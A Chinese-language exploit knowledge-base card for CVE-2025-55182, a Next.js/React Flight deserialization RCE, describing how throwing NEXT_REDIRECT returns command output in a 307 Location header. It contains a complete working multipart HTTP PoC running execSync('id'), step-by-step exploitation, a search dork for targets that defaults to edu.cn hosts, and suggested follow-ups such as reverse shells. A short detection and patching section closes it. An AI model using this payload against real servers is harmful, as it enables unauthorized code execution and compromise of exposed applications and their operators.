---
id: web-nodejs-deserialization-react-flight-next-redirect-echo
title: CVE-2025-55182 有回显利用：NEXT_REDIRECT digest 把命令输出带进 307 Location
type: scenario
domain: web
path: web/nodejs/deserialization
technique: react-flight-next-redirect-echo
tags:
- nodejs
- nextjs
- react
- flight-protocol
- deserialization
- cve-2025-55182
- rce
- echo
- redirect
cve:
- CVE-2025-55182
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T17:46:56+08:00'
  notes: 已通读原文并核对 61 张本地图及 ext 目录：原文 0x5 节给出完整 multipart POC（then=$1:__proto__:then、status=resolved_model、_prefix 中 execSync('id') 后抛 NEXT_REDIRECT digest）并称可成功 RCE，卡内 PoC 与原文逐字段一致，digest 307 回显机制说明合理。ext/nextjs_versions.jpg 实际为 XML（下载到网页而非图片），受影响版本表无法读取，故未设置 affected_versions；原文也未在正文写出区间。未验证点：未复跑 PoC；NEXT_REDIRECT digest 回显为原文所述，未在本机验证。frontmatter 无 sources/source_url。
url: /docs/web/nodejs/deserialization/web-nodejs-deserialization-react-flight-next-redirect-echo/
draft: false
kb_aliases:
- CVE-2025-55182 回显
- React2Shell 回显
- NEXT_REDIRECT digest
- Next.js RCE 回显
- Flight Chunk 命令输出外带
---

## 一句话结论

在 CVE-2025-55182 的 Flight Chunk 利用链中，把 `_response._prefix` 写成“执行命令后抛出 `NEXT_REDIRECT`，digest 为 `NEXT_REDIRECT;push;/login?a=<命令输出>;307;`”，Next.js 会把这个错误转成 307 重定向，命令输出随 `Location` 头返回，从而把盲 RCE 变成单请求可回显的利用。

## 原理

- CVE-2025-55182 的底层是 Flight 协议反序列化链：伪造 Chunk 的 `then` 通过 `$1:__proto__:then` 取得真实 thenable，`status=resolved_model` 让服务端进入 `initializeModelChunk`，`_response._prefix` 被拼接进 `$B` 分支并由 `Function` 构造执行（详见关联卡）。
- 常规利用在 `_prefix` 中执行 `execSync('id')` 后，命令输出没有自然回显通道，往往需要反弹 shell 或带外 DNS/HTTP。本文利用 Next.js 自身的重定向机制构造回显。
- Next.js 的 Server Action/渲染层会把带有特殊 `digest` 的异常识别为控制流指令：`NEXT_REDIRECT;push;<url>;307;` 表示以 307 状态重定向到 `<url>`（`push` 对应客户端路由 push）。服务端捕获该异常后，把 URL 写入响应的 `Location` 头，而不是当作 500 错误。
- 因此 `_prefix` 可以是：
  `var res = process.mainModule.require('child_process').execSync('id').toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest: \`NEXT_REDIRECT;push;/login?a=${res};307;\`});`
  命令结果被插入 URL 查询参数，随 307 响应的 `Location` 返回给攻击者。
- 为什么成立：`execSync` 同步返回命令输出；`NEXT_REDIRECT` 是框架公开的控制流机制，处理优先级高于普通异常；`Location` 头不受页面模板影响，因此无需页面回显点。
- 边界：若目标版本修复了 Flight 反序列化链，利用不成立；若前置代理不返回 `Location` 或自动跟随重定向，需要在客户端关闭跟随并读取 3xx 响应头。

## 触发条件

- 目标为受影响的 React Server Components/Next.js App Router 应用，且暴露 Flight 协议入口（接受 multipart 的 Server Action/页面 POST）。
- 服务端存在 CVE-2025-55182 的三处 Flight 解析缺陷（路径引用可走 `__proto__`/`constructor`、Chunk/Response 无实例校验、`$B` 分支信任 `_formData.get`）。
- 目标未升级到修复版本，且 WAF 未拦截 `__proto__`、`$1:`、`$B`、`$@`、`NEXT_REDIRECT` 等特征。
- 攻击者能读取 3xx 响应的 `Location` 头（关闭自动跟随）。
- Node 进程可执行 `child_process`（默认具备）。

## 利用步骤

1. 用空间引擎定位目标：`app="Next.js" && body="/_next/static/chunks/app/" && host="edu.cn"`（按授权范围调整），确认 App Router 与 Server Action 入口。
2. 记录页面或 Server Action 的 POST URL，准备 multipart 请求，带 `Next-Action: x` 等头部。
3. 构造三个字段：
   - field 0：伪造 Chunk JSON，`then` 指向 `$1:__proto__:then`，`status=resolved_model`，`value` 为 `{"then":"$B1337"}`，`_response._prefix` 放入执行命令并抛出 `NEXT_REDIRECT` 的代码，`_response._formData.get` 为 `$1:constructor:constructor`；
   - field 1：`"$@0"`；
   - field 2：`[]`。
4. 发送请求，**不要自动跟随重定向**，读取响应状态与 `Location` 头；`Location` 中的查询参数即命令输出。
5. 若输出被 URL 编码，做一次解码；若命令含特殊字符，先 `encodeURIComponent` 或改用 base64。
6. 用 `id`、`whoami`、`hostname` 等无副作用命令确认；后续可执行下载、写文件或反弹 shell。

## PoC

```http
POST / HTTP/1.1
Host: target
Next-Action: x
X-Nextjs-Request-Id: ygdkgols
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: 0OySzliul7lMdEUPchXuS

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

```text
# 预期响应（不跟随重定向）：
HTTP/1.1 307 Temporary Redirect
Location: /login?a=uid=0(root) gid=0(root) groups=0(root)
# 或对应应用池/容器用户身份
```

## 变体与关联

- 变体：把 `push` 换成 `replace`，或调整状态码；不同 Next.js 版本的 digest 解析可能略有差异，按目标调试。
- 变体：若 `Location` 被网关过滤，可把输出编码/分段，或改用其他可由服务端控制的响应头/错误页。
- 变体：无回显需求时仍可用原 Flight Chunk 链执行反弹 shell；本卡只是把盲执行变成可观测。
- 关联：[[web-nodejs-deserialization-react-flight-chunk-proto-function-rce]]（同一 CVE 的 Flight Chunk 原型链原理与原始 PoC）、[[web-nodejs-deserialization-react-actions-action-ref-vm-rce]]（同一 CVE 的 Server Actions `$ACTION_REF_`/`vm#runInThisContext` 路径）。
- 边界：修复版本、WAF 拦截、代理跟随重定向并隐藏 `Location`、或 Node 禁用了 `process.mainModule` 时，需要换其他回显/带外方式。

## 检测与防御

- 检测：multipart 请求中出现 `__proto__`、`constructor`、`$1:`、`$@`、`$B`、`resolved_model`、`_prefix`、`NEXT_REDIRECT` 等 Flight 特征；`Next-Action` 头异常；响应 307 的 `Location` 含命令输出/异常查询参数。
- 修复：升级 React Server Components/Next.js 到官方修复版本；无法升级时禁用不必要的 Server Actions/RSC 入口。
- 加固：WAF 对 Flight 解码后的内容检测，不能只匹配原始编码；Node 进程最小权限、容器只读、限制出站；监控 Node 派生 `sh`/`id` 等子进程。
- 运营：对公开的 Next.js 资产做版本盘点，优先修复暴露在互联网的 App Router 应用。
